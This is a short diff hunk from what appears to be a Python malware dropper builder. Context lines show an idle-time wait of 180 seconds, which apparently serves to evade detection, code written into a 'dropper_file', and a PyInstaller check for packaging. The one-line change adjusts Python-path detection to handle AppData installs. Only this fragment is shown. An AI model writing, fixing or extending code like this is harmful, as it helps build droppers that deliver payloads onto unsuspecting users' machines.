@@ -193,7 +193,7 @@ while get_idle_duration() < 180:
         dropper_file.write(code)
     print(dropper_py_file)
     python_path = find_python_path()
-    if 'program' in python_path.lower():
+    if 'program' in python_path.lower() and 'appdata' not in python_path.lower():
         check_if_pyinstaller_installed = f'pip list'
     else:
         check_if_pyinstaller_installed = f"{python_path} -m pip list"
